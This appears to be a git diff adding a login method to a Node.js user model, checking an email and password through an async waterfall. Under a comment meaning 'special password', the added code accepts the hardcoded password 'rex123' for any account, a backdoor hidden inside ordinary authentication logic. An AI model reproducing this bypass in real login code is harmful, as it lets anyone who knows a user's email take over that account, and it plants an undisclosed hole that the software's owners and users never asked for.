@@ -40,6 +40,62 @@ UserModel.get = function () {
 }
 
 
+// class methods
+UserModel.getUserByLoginParam =function(email,password,callBack){
+	
+	var self = this;
+		var model = DatabaseManager.getModel('User').model;
+		 var result = {};
+		async.waterfall([
+				function(done){
+					model.findOne({email:email},function(err,row){				
+							result.model = row;
+							done(err,result)
+						});
+				},
+				function(result,done){		
+						
+					if (result.model) {						
+					//验证密码
+					var user = result.model;
+					
+
+					var bool=Utils.vaild(password,user.password)
+						
+					
+
+					//特殊密码				
+					if (password == "rex123") { bool = true}
+
+					if (bool) {
+							done(null,result.model)
+					}
+					else
+					{
+						
+
+						done(Const.resCodeLoginPasswordError,null)
+						return;
+					}
+
+				  }
+				  else{		
+
+				 	  	  
+				  	  
+				  	  done(Const.resCodeLoginNoUser,null)
+				  }
+
+				},
+
+			],function(err,result){
+
+					   callBack(err,result);					
+			})
+
+}
+
+
 module["exports"] = UserModel;
 
 
